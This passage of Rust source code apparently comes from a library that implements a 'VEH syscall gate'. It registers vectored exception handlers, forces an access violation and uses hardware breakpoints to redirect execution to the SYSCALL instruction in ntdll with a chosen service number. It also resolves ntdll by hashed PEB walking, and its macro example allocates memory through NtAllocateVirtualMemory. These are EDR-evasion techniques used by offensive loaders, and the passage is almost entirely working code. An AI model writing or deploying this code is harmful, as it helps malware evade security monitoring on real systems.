                    // Keep the current RSP (we're deep in ntdll's stack frame now)
                    (*ei.ContextRecord).Rsp = temp_rsp;
                    // Set up syscall registers
                    (*ei.ContextRecord).R10 = (*ei.ContextRecord).Rcx;
                    (*ei.ContextRecord).Rax = ssn as u64;
                    // Point RIP at the SYSCALL instruction
                    (*ei.ContextRecord).Rip = entry_address + sys_off;

                    // Copy extended stack arguments (5th through 12th)
                    if extended {
                        let saved_rsp = ctx.Rsp;
                        let cur_rsp = (*ei.ContextRecord).Rsp;

                        macro_rules! copy_stack_arg {
                            ($offset:expr) => {
                                ptr::copy_nonoverlapping(
                                    (saved_rsp + $offset) as *const u64,
                                    (cur_rsp + $offset) as *mut u64,
                                    1,
                                );
                            };
                        }

                        copy_stack_arg!(FIFTH_ARGUMENT);
                        copy_stack_arg!(SIXTH_ARGUMENT);
                        copy_stack_arg!(SEVENTH_ARGUMENT);
                        copy_stack_arg!(EIGHTH_ARGUMENT);
                        copy_stack_arg!(NINTH_ARGUMENT);
                        copy_stack_arg!(TENTH_ARGUMENT);
                        copy_stack_arg!(ELEVENTH_ARGUMENT);
                        copy_stack_arg!(TWELVETH_ARGUMENT);
                    }
                }
            }

            // Clear TRACE_FLAG -- the SYSCALL instruction will execute cleanly
            (*ei.ContextRecord).EFlags &= !TRACE_FLAG;
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }

    // Default: keep single-stepping
    (*ei.ContextRecord).EFlags |= TRACE_FLAG;
    EXCEPTION_CONTINUE_EXECUTION
}

// ══════════════════════════════════════════════════════════════════════════════
// Public API
// ══════════════════════════════════════════════════════════════════════════════

/// Initialize the VEH syscall gate.
///
/// Registers two Vectored Exception Handlers and resolves ntdll's base/end
/// addresses via PEB walking. Must be called once before any `set_hw_bp` call.
///
/// # Errors
/// Returns `Err` if either VEH handler registration fails.
#[allow(static_mut_refs)]
pub fn initialize() -> anyhow::Result<()> {
    unsafe {
        H1 = AddVectoredExceptionHandler(CALL_FIRST, Some(AddHwBp));
        if H1.is_null() {
            return Err(anyhow::anyhow!("AddVectoredExceptionHandler(AddHwBp) failed"));
        }

        H2 = AddVectoredExceptionHandler(CALL_FIRST, Some(HandlerHwBp));
        if H2.is_null() {
            RemoveVectoredExceptionHandler(H1);
            H1 = ptr::null_mut();
            return Err(anyhow::anyhow!(
                "AddVectoredExceptionHandler(HandlerHwBp) failed"
            ));
        }

        // Resolve ntdll base + end address via PEB walk
        let (base_ptr, size) = ldr_module_info(NTDLL_HASH);
        if base_ptr.is_null() {
            RemoveVectoredExceptionHandler(H2);
            RemoveVectoredExceptionHandler(H1);
            H1 = ptr::null_mut();
            H2 = ptr::null_mut();
            return Err(anyhow::anyhow!("failed to resolve ntdll.dll via PEB"));
        }

        if let Ok(mut info) = NTDLL_INFO.lock() {
            info.base_address = base_ptr as u64;
            info.end_address = base_ptr.add(size) as u64;
        }
    }

    Ok(())
}

/// Remove VEH handlers. Safe to call even if `initialize()` was never called.
#[allow(static_mut_refs)]
pub fn destroy() {
    unsafe {
        if !H1.is_null() {
            RemoveVectoredExceptionHandler(H1);
            H1 = ptr::null_mut();
        }
        if !H2.is_null() {
            RemoveVectoredExceptionHandler(H2);
            H2 = ptr::null_mut();
        }
    }
}

/// Trigger a VEH-mediated syscall via hardware breakpoints.
///
/// # Arguments
/// * `addr`     -- Address of the ntdll Nt* stub to invoke
/// * `extended` -- Non-zero if the syscall has more than 4 arguments
/// * `ssn`      -- System Service Number
///
/// # Safety
/// Caller must ensure `addr` points to a valid ntdll syscall stub.
/// `initialize()` must have been called first.
pub unsafe fn set_hw_bp(addr: usize, extended: u8, ssn: u32) {
    if let Ok(mut state) = STATE.lock() {
        state.extended_args = extended != 0;
        state.syscall_no = ssn;
    }

    // Trigger ACCESS_VIOLATION with the target stub address in RCX.
    // xor rax, rax; mov edx, [rax]  => reads from address 0 => ACCESS_VIOLATION
    // AddHwBp handler reads RCX to get the target function address.
    core::arch::asm!(
        "xor rax, rax",
        "mov edx, dword ptr [rax]",
        in("rcx") addr,
        out("rax") _,
        out("rdx") _,
        clobber_abi("system"),
    );
}

/// Retrieve and clear the return value (RAX / NTSTATUS) of the last VEH syscall.
///
/// Returns `Some(ntstatus)` if a VEH syscall completed since the last call,
/// `None` otherwise. Each call consumes the stored value.
pub fn take_last_rax() -> Option<u64> {
    if let Ok(mut last) = LAST_RAX.lock() {
        last.take()
    } else {
        None
    }
}

// ══════════════════════════════════════════════════════════════════════════════
// veh_syscall! macro
// ══════════════════════════════════════════════════════════════════════════════

/// Convenience macro to resolve an ntdll syscall by name, set the hardware
/// breakpoint, and invoke the function pointer through the VEH gate.
///
/// # Usage
/// ```ignore
/// let status = veh_syscall!(
///     "NtAllocateVirtualMemory",
///     OrgNtAllocateVirtualMemory,   // type alias for the fn signature
///     process_handle, &mut base_address, 0usize, &mut region_size, alloc_type, protect
/// );
/// ```
///
/// Resolves the SSN and address at runtime, calls `set_hw_bp` to arm the
/// hardware breakpoint, then invokes the function. The VEH handlers intercept
/// at the ntdll stub, execute the syscall from ntdll's .text, and return
/// the NTSTATUS normally.
#[macro_export]
macro_rules! veh_syscall {
    ($syscall_name:expr, $fn_sig:ty, $($param:expr),*) => {{
        let mut syscall_addr: *mut u8 = core::ptr::null_mut();

        let ssn = unsafe {
            $crate::veh_gate::get_ssn_by_name($syscall_name, None, &mut syscall_addr)
        };

        if ssn < 0 || syscall_addr.is_null() {
            panic!("veh_syscall: unable to resolve '{}' (ssn={}, addr={:?})",
                   $syscall_name, ssn, syscall_addr);
        }

        let pt_syscall: $fn_sig = unsafe { core::mem::transmute(syscall_addr) };

        // Determine if extended args (>4 parameters) are needed.
        // Count the comma-separated params; if > 4, pass extended=1.
        let param_count = {
            let mut n = 0u8;
            $(let _ = &$param; n += 1;)*
            n
        };
        let extended_flag: u8 = if param_count > 4 { 1 } else { 0 };

        unsafe { $crate::veh_gate::set_hw_bp(syscall_addr as usize, extended_flag, ssn as u32) };

        unsafe { pt_syscall($($param),*) }
    }};
}

```